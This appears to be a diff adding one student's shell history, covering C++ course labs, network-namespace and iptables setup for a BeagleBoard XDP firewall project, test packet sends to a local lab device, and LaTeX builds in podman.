+python test_1brc.py -help
+python test_1brc.py --help
+ls
+v test.py
+v runner.py
+v productivity.py
+ls test-data
+ls io_files
+python productivity.py io_files/measurements-10000-unique-keys.txt
+python productivity.py io_files/measurements-10000-unique-keys.txt a
+python productivity.py io_files/measurements-10000-unique-keys.txt a
+python productivity.py io_files/measurements-10000-unique-keys.txt a
+python productivity.py io_files/measurements-10000-unique-keys.txt a
+./build/1brc io_files/measurements-10000-unique-keys.txt b
+./build/1brc io_files/measurements-10000-unique-keys.txt b
+./build/1brc io_files/measurements-10000-unique-keys.txt b
+python productivity.py io_files/measurements-10000-unique-keys.txt a
+touch b
+./build/1brc io_files/measurements-10000-unique-keys.txt b
+cat io_files/measurements-10000-unique-keys.txt
+./build/1brc io_files/measurements-10000-unique-keys.txt b
+cat b
+cat a
+ls
+./tests-build/1brc io_files/measurements-10000-unique-keys.txt b
+python runner.py 2 0
+cd build
+python ../runner.py 2 0
+ls ../configs
+cp ../configs ./configs
+python ../runner.py 2 0
+ls
+cp ../configs ./configs -r
+python ../runner.py 2 0
+cd ..
+python runner.py 2 0
+cp io_files ../io_files -r
+python runner.py 2 0
+python runner.py 2 0
+python runner.py 2 0
+python runner.py 2 0
+python runner.py 2 0
+python runner.py 2 0
+v configs/measurements-2.cfg
+python productivity.py io_files/measurements-2.txt a
+python productivity.py io_files/measurements-2.txt a
+python productivity.py configs/measurements-2.cfg a
+python productivity.py io_files/measurements-2.txt a
+ls configs
+v configs/1_b_data.cfg
+v src/main_brc.cpp
+v CMakeLists.txt
+v CMakeLists.txt
+v src/brc.
+v src/brc.cpp
+v CMakeLists.txt
+v src/brc.cpp
+v CMakeLists.txt
+cd ..
+git clone git@github.com:ucu-cs/lab7-words-count-unicode-korets_tserkovna_kotliarchuk__.git
+cd lab7-words-count-unicode-korets_tserkovna_kotliarchuk__
+ls
+v CMakeLists.txt
+v readme.md
+o lab7.pdf
+cp ~/Templates/cpp_template/cmake ~/Templates/cpp_template/project.Dockerfile ~/Templates/cpp_template/compile.sh . -r
+cppbuild lab7check
+cppcompile lab7check -p
+v project.Dockerfile
+cppbuild lab7check
+cppcompile lab7check -p
+git pull
+git branch
+git log
+v src/file_read.cpp
+git pull
+cppcompile lab7check -p
+git pull
+git pull --rebase
+git stash
+git pull --rebase
+git pop
+git stash pop
+cppcompile lab7check -p
+ls
+cd ..
+git clone
+git clone git@github.com:ucu-cs/lab8-words-count-parallel-korets_tserkovna_kotliarchuk__.git
+cd lab8-words-count-parallel-korets_tserkovna_kotliarchuk__
+ls
+./compile.sh -d
+v compile.sh
+./compile.sh -d
+v compile.sh
+mkdir build
+cd build
+cmake ..
+cmake --build .
+sudo dnf install libarchive-devel
+cmake --build .
+ls
+cd ..
+ls
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/test_words.py .
+python test_words.py tools -C -s
+cd ..
+v src/main.cpp
+ls cmake-build-tests
+v CMakeLists.txt
+v CMakeLists.txt
+python test_words.py parallel -C -s
+python test_words.py parallel -C -s -t 10000
+v readme.md
+v test_words.py
+python test_words.py parallel -C -s
+j lab7
+j lab7
+j lab7
+v src/main.cpp
+cppbuild lab8check
+cppcompile lab7check -p
+ls
+./compile.sh -c
+v ./compile.sh
+o lab8\ \(1\).pdf
+ls
+python test_words.py parallel -p
+v tmp
+./cmake-build-tests/countwords_par tmp
+./cmake-build-tests/countwords_par tmp
+./cmake-build-tests/countwords_par tmp
+./cmake-build-tests/countwords_par tmp
+v tmp
+./cmake-build-tests/countwords_par tmp
+v tmp
+mv tmp /tmp/tmp.cfg
+./cmake-build-tests/countwords_par /tmp/tmp.cfg
+python test_words.py parallel
+v test_words.py
+python test_words.py parallel -C
+python test_words.py parallel -s
+v test_words.py
+cp /drive/Projects/ucu/acs/assistance/UCU_autotests/acs/words_count/testing_dirs ./testing_dirs -r
+mv /tmp/tmp.cfg .
+v tmp.cfg
+o .
+v tmp.cfg
+./cmake-build-tests/countwords_par tmp.cfg
+v tmp.cfg
+ls
+./build/countwords_par_archives_out tmp.cfg
+v tmp.cfg
+ls __tests__
+v tmp.cfg
+./build/countwords_par_archives_out tmp.cfg
+./build/countwords_par_archives_out tmp.cfg
+v tmp.cfg
+./build/countwords_par_archives_out tmp.cfg
+./build/countwords_par_archives_out tmp.cfg
+ls
+python python_version/main.py tmp.cfg
+v python_version/main.py
+python python_version/main.py tmp.cfg
+v python_version/main.py
+./build/countwords_par_thread_scheduler tmp.cfg
+ls
+cd additional
+ls
+v thread_scheduler.cpp
+v tmp.cfg
+./build/countwords_par_thread_scheduler tmp.cfg
+v tmp.cfg
+./build/countwords_par_thread_scheduler tmp.cfg
+v tmp.cfg
+./build/countwords_par_thread_scheduler tmp.cfg
+ls
+v tmp.cfg
+./build/countwords_par_thread_scheduler tmp.cfg
+ls ..
+cd ../lab7-words-count-unicode-korets_tserkovna_kotliarchuk__
+ls
+git pull
+j lab7
+v CMakeLists.txt
+cd /large/virt
+ls
+o .
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+arp -a
+ssh beagle@10.10.224.2
+arp -a
+sudo dnf install nmap
+sudo nmap -sn 10.42.0.1/24
+arp -a
+ssh beagle@10.42.0.114
+sudo dnf remove nmap
+arp -a
+ду�
+ls
+\rm -r lab8-words-count-parallel-koval__sirska
+\rm -fr lab8-words-count-parallel-koval__sirska
+cd Downloads
+ls
+cd lab8-words-count-parallel-korets_tserkovna_kotliarchuk__
+git pull
+ls
+ls additional
+v additional/concurrent_hash_map.h
+git pull
+v additional/main_chm.cpp
+./compile.sh -d
+ls
+cd build
+cmake --build .
+cmake ..
+cmake --build .
+cd ../lab7
+ls ..
+cd ../../lab7-words-count-unicode-korets_tserkovna_kotliarchuk__
+ls
+./compile.sh -d
+ls
+python runner.py 2 0
+ls
+ls build
+mkdir build
+cmake ..
+cd build
+cmake ..
+cmake --build .
+cd ..
+python runner.py 2 0
+v runner.py
+ls
+ls build
+v runner.py
+v runner.py
+v cfg/conf1.cfg
+v cfg/conf1.cfg
+cd ../lab8-words-count-parallel-korets_tserkovna_kotliarchuk__
+cd build
+ls
+cd ..
+./build/countwords_par_concurrent_map tmp.cfg
+./build/countwords_par_concurrent_map tmp.cfg
+o lab8\ \(2\).pdf
+cd Downloads/lab7-words-count-unicode-korets_tserkovna_kotliarchuk__
+git pull
+git stash
+git pull
+git stash pop
+o lab7\ \(1\).pdf
+ls
+cp ../lab8-words-count-parallel-korets_tserkovna_kotliarchuk__/tmp.cfg .
+./build/countwords_seq tmp.cfg
+cd ../lab8-words-count-parallel-korets_tserkovna_kotliarchuk__
+./build/countwords_par tmp.cfg
+ls
+v a.txt
+v tmp.cfg
+v tmp.cfg
+./build/countwords_par tmp.cfg
+cd ../lab7-words-count-unicode-korets_tserkovna_kotliarchuk__
+cp ../lab8-words-count-parallel-korets_tserkovna_kotliarchuk__/tmp.cfg .
+./build/countwords_seq tmp.cfg
+v a.txt
+cd -
+./build/countwords_par tmp.cfg
+ip a
+ip a
+ip a
+ip a
+j sec
+ls
+cd tss-opa
+git pull
+ls
+v beagle_network.sh
+sh beagle_network.sh
+ip a
+sh beagle_network.sh
+v beagle_network_reset.sh
+sh beagle_network_reset.sh
+v beagle_network_reset.sh
+sh beagle_network_reset.sh
+sh beagle_network.sh
+sudo ip netns exec server python -m http.server 8080
+sudo ip netns exec client curl http://192.168.69.2:8080
+sh beagle_network_reset.sh
+sh beagle_network.sh
+sh beagle_network_reset.sh
+sh beagle_network.sh
+sh beagle_network_reset.sh
+sh beagle_network.sh
+ssh beagle@10.42.0.114
+j tss
+sudo ip netns exec server python -m http.server 8080
+sudo ip netns exec client curl http://192.168.69.2:8080
+sudo ip netns exec client curl http://192.168.69.2:8080
+sudo iptables -L FORWARD -v -n
+sudo ip netns exec client ping 192.168.42.1
+sudo ip netns exec client ping 192.168.69.1
+sudo ip netns exec client ping 192.168.69.2
+sh beagle_network_reset.sh
+ip a
+sh beagle_network.sh
+sh beagle_network.sh
+sh beagle_network.sh
+ssh beagle@10.42.0.114
+sudo ip netns exec server python -m http.server 8080 --bind 192.168.69.2
+sudo ip netns exec client curl http://192.168.69.2:8080
+sudo ip netns exec client ping 192.168.69.2
+sudo ip netns exec server ss -tlpn | grep 8080
+sh beagle_network_reset.sh
+sh beagle_network_reset.sh
+ssh beagle@10.42.0.114
+sh beagle_network.sh
+sudo ip netns exec server python -m http.server 8080 --bind 192.168.69.2
+sudo ip netns exec server ss -tlpn | grep 8080
+sudo ip netns exec client ping 192.168.69.2
+sudo ip netns exec client curl http://192.168.69.2:8080
+sudo ip netns exec server tcpdump -i veth-s -n tcp port 8080
+sudo ip netns exec client curl http://192.168.69.2:8080
+sudo ip netns exec client ping 192.168.69.2
+sh beagle_network_reset.sh
+sh beagle_network.sh
+sudo ip netns exec server python3 -m http.server 8080 --bind 192.168.69.2
+sudo ip netns exec client curl http://192.168.69.2:8080
+sudo ip netns exec client ping -c 3 192.168.69.2
+sudo iptables -P FORWARD ACCEPT
+ip a
+sh beagle_network_reset.sh
+\rm beagle_*
+ls
+ip a
+ip a
+ssh beagle@10.42.0.114
+ssh beagle@10.42.0.114
+ssh beagle@10.42.0.114
+ssh beagle@10.42.0.114
+ssh beagle@10.42.0.114
+ip a
+ip a
+ip a
+ip a
+ssh beagle@10.42.0.114
+arp -a
+arp -a
+arp -a
+arp -a
+arp -a
+ssh beagle@10.42.0.114
+arp -a
+ip a
+ip a
+arp -a
+arp -a
+arp -a
+arp -a
+arp -a
+arp -a
+arp -a
+arp -a
+arp -a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+arp -a
+ssh beagle@10.42.0.114
+curl http://10.42.0.114:8080
+v test_script.sh
+ip a
+      sudo sysctl net.ipv4.ip_forward=1
+v linux_setup.sh
+sudo iptables -t nat -A POSTROUTING -s 10.42.0.0/24 -o Privex -j MASQUERADE\
+sudo iptables -A FORWARD -i enp3s0 -o Privex -s 10.42.0.0/24 -m state --state NEW,RELATED,ESTABLISHED -j ACCEPT\
+sudo iptables -A FORWARD -i Privex -o enp3s0 -m state --state RELATED,ESTABLISHED -j ACCEPT
+ssh beagle@10.42.0.114
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ip a
+ssh beagle@10.42.0.114
+curl http://10.42.0.114:8080
+ls
+./bin/packet_sender "10.42.0.114" "1337" "Hi"
+./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+curl http://10.42.0.114:8080
+curl http://10.42.0.114:8080
+curl http://10.42.0.114:8080
+curl http://10.42.0.114:8080
+curl http://10.42.0.114:8080
+ping 10.42.0.114
+echo "Hello UDP" | nc -u 10.42.0.114 8080
+echo "Hello UDP" | nc -u 10.42.0.114 8080
+echo "Hello UDP" | nc -u 10.42.0.114 8080
+v password_packet_sender
+v password_packet_sender/packet_sender.c
+killall neovim
+killall nvim
+v linux_setup.sh
+v password_packet_sender/packet_sender.c
+cd password_packet_sender
+make
+cd ..
+sudo ./bin/packet_sender "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender "10.42.0.1" "10.42.0.114" "1337" "Hi"
+sudo ./bin/packet_sender 10.42.0.114 1337 "Hi" -s 10.42.0.1
+sudo ./bin/packet_sender 10.42.0.114 1337 "Hi" -s 10.42.0.1
+sudo ./bin/packet_sender 10.42.0.114 1337 "Hi" -s 10.42.0.1
+sudo ./bin/packet_sender 10.42.0.114 1337 "Hi" -s 10.42.0.1
+sudo ./bin/packet_sender 10.42.0.114 1337 "Hi" -s 10.42.0.1
+sudo ./bin/packet_sender 10.42.0.114 1337 "Hi" -s 10.42.0.1
+scp bin/xdp-firewall beagle@10.42.0.114:/home/beagle/
+scp . beagle@10.42.0.114:/home/beagle/tss-opa
+scp . beagle@10.42.0.114:/home/beagle/tss-opa -r
+scp -r . beagle@10.42.0.114:/home/beagle/tss-opa
+v third_party/vmlinux/arm64/vmlinux.h
+v third_party/vmlinux/arm64/vmlinux_601.h
+cd third_party/vmlinux/arm64/
+\rm vmlinux.h
+ln -s vmlinux_601.h vmlinux.h
+cd ../../
+cd ../tss-opa
+ls
+cd ..
+ls
+cd password_packet_sender
+v packet_sender.c
+ssh beagle@10.42.0.114
+ip a
+ip a
+ssh beagle@10.42.0.114
+sudo su
+sudo su
+ls
+sudo su
+ls
+./build/packet_sender
+ ./build/packet_sender -p AABBCCDDEEFF11223344556677889900 10.42.0.114 1010 "Hello\
+
+ ./build/packet_sender -p AABBCCDDEEFF11223344556677889900 10.42.0.114 1010 Hello\
+
+sudo  ./build/packet_sender -p AABBCCDDEEFF11223344556677889900 10.42.0.114 1010 Hello\
+
+ls
+cd ../
+ls
+./bin/xdp-firewall -p AABBCCDDEEFF11223344556677889900 lo 1010 -S
+./bin/xdp-firewall -p AABBCCDDEEFF11223344556677889900 lo 1010 -S
+sudo  ./build/packet_sender -p AABBCCDDEEFF11223344556677889900 10.42.0.114 1010 Hello\
+
+ssh beagle@10.42.0.114
+ip a
+ssh beagle@10.42.0.114
+git status
+mv beagle_setup.sh linux_setup.sh tests
+git add .
+ls
+cd third_party/vmlinux
+ls
+cd -
+git status
+git commit -m "Add setup for networks other than lo"
+git push
+j cpp-
+ls
+v CMakeLists.txt
+v README.md
+git add .
+git commit -m "Make readme better explain how to run"
+git push
+v README.md
+git add .
+git commit -m "Add that commands need sudo"
+git push
+v README.md
+git pull
+v tss-opa/xdp-firewall.bpf.c
+git pull
+git status
+git diff
+git reset --hard
+v test_script.sh
+v test_script.sh
+v password_packet_sender/packet_sender.c
+v tss-opa/xdp-firewall.bpf.c
+v test_script.sh
+git pull
+git add .
+git commit -m "Remove mentions of password"
+git pull --rebase
+v test_script.sh
+git push
+v test_script.sh
+v test_script.sh
+j mmml
+ls
+cd project
+ls
+git add .
+git commit -m "Add ipynb"
+git push
+v .git/config
+j sec
+ls
+cd lab5-chr-again
+ls
+v data/10k-password-list.txt
+git push
+git add .
+git commit -m "Add LoRA to regular speed comparison"
+git push
+git pull --rebase
+git push
+git status
+git add Model_compression_and_parameter_efficient_fine_tuning.pdf
+git commit -m "Add pdf"
+git push
+cd Arduino/Projects/s6_uv_lab6
+git add .
+git commit -m "Stop when an obstacle is in front"
+git push
+v README.md
+mkdir build
+cd build
+cmake ..
+cmake --build .
+./ieee_754
+j sec
+ls
+cd tss-opa
+ls
+v README.md
+git blame
+ls
+cd ..
+zip ieee_754_korets-main
+ls
+zip ieee_754_korets-main out.zip
+o .
+cd ieee_754_korets-main
+ls
+v task1/ieee_fp.cpp
+cd Arduino/Projects/s6_uv_lab6
+git log
+git checkout cd79ae88e8aee7b60ef8dfff064d02df4cd01e12
+git checkout a97515286dd1f23005f3d793c046dbe26e0d09ad
+git checkout 94ed7da45d6fccd088db5c65c39f6d9eb82bfbc7
+git checkout main
+j rayt
+j acs
+ls
+cd raytracer
+ls
+v src/main.cpp
+v src/aabb.cpp
+convim
+convim
+convim
+lvim main.tex
+lvim main.tex
+lvim main.tex
+convim
+ls dotfiles/scripts
+cd dotfiles/scripts
+ls
+unzip sioyek-release-linux-portable.zip
+ls
+\rm Sioyek-x86_64.AppImage.config -r
+mv sioyek-release-linux-portable.zip sioyek.AppImage
+lvim main.tex
+chmod +x dotfiles/scripts/sioyek.AppImage
+lvim main.tex
+dotfiles/scripts/sioyek.AppImage
+./dotfiles/scripts/sioyek.AppImage
+./dotfiles/scripts/sioyek.AppImage -h
+./dotfiles/scripts/sioyek.AppImage --help
+cd -
+cd dotfiles/scripts
+\rm sioyek.AppImage
+ls
+mv Sioyek-x86_64.AppImage sioyek.AppImage
+chmod +x dotfiles/scripts/sioyek.AppImage
+ls
+chmod +x sioyek.AppImage
+lvim main.tex
+./sioyek.AppImage
+lvim main.tex
+ls
+convim
+podman image list
+ls
+j cv
+podman build . -t pdflatex
+convim
+podman build . -t tex
+podman build . -t tex
+v Dockerfile
+podman image list
+podman image rm docker.io/kjarosh/latex
+podman image rm kjarosh/latex
+podman image list
+podman image rm 7a2c1c396e03
+podman image rm 7a2c1c396e03 --force
+podman build . -t tex
+lvim main.tex
+convim
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info a.tmp 2>&1
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info a.tmp
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info --help
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info -h
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info a.tmp main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info source main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info main.tex main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info main.tex main.tex main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info -s main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info -S main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex rubber-info --source main.tex
+convim
+lvim main.tex
+rubber-info
+convim
+lvim main.tex
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex which rubber-info
+podman run -i --rm -e A="main.tex" -e LOGFILE="a.tmp" -v .:/app tex which -a rubber-info
+podman run -i --rm -v .:/app tex which rubber-info
+podman run -i --rm -v .:/app tex which rubber-info -a
+podman run -i --rm -v .:/app tex which
+podman run -i --rm -v .:/app tex which -h
+podman run -i --rm -v .:/app tex which --help
+podman run -i --rm -v .:/app tex cat /bin/rubber-info
+podman run -ti --rm -v .:/app tex cat /bin/rubber-info
+podman run -ti --rm --exec -v .:/app tex cat /bin/rubber-info
+convim
+lvim main.tex
+sudo dnf install rubber-info
+lvim main.tex
+lvim main.tex
+\rm *.log
+lvim main.tex
+ls
+\rm main.aux main.out
+ls
+la
+lvim main.tex
+lvim main.tex
+podman build . -t tex
+podman image rm localhost/tex:latest
+podman image rm localhost/tex:latest -f
+podman build . -t tex
+curl 10.10.230.139:32270
+curl 10.10.230.139:32770
+ls
+convim
+v dotfiles/scripts/install_fedora.sh
+v dotfiles/scripts/install_fedora.sh
+sudo dnf install -y 'tex(wallpaper.sty)' 'tex(fontawesome5.sty)' 'tex(hyphenat.sty)' rubber
+convim
+lvim main.tex
+o .
+sudo dnf install uv
+uv
+v dotfiles/scripts/install_fedora.sh
+uv venv -h
